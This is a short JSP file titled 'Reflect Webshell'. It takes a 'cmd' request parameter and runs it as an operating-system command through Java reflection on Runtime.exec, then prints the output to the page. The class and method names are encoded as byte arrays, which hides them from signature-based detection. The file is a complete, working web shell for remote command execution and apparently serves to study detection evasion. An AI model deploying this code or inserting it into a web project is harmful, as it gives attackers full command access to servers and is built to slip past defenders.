<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %><%--
  Created by IntelliJ IDEA.
  User: n0zom1z0
  Date: 2024/10/3
  Time: 20:59
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String cmd = request.getParameter("cmd");
    // java.lang.Runtime
    String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101});

    Class<?> c = Class.forName(rt);
    // getRuntime
    Method m1 = c.getDeclaredMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101}),null);
    m1.setAccessible(true);
    // exec
    Method m2 = c.getDeclaredMethod(new String(new byte[]{101,120,101,99}),String.class);

    // Runtime.getRuntime().exec("whoami");
    Object object = m2.invoke(m1.invoke(null,new Object[]{}),new Object[]{cmd});
    // getInputStream
    Method m = object.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));
    m.setAccessible(true);
    InputStream in = (InputStream) m.invoke(object,null);
    BufferedReader br = new BufferedReader(new InputStreamReader(in));
    String line;
    while ((line = br.readLine()) != null){
        out.print("<pre>" + line + "</pre>");
    }
//    out.println(in);

%>
<html>
<head>
    <title>Reflect Webshell</title>
</head>
<body>

</body>
</html>
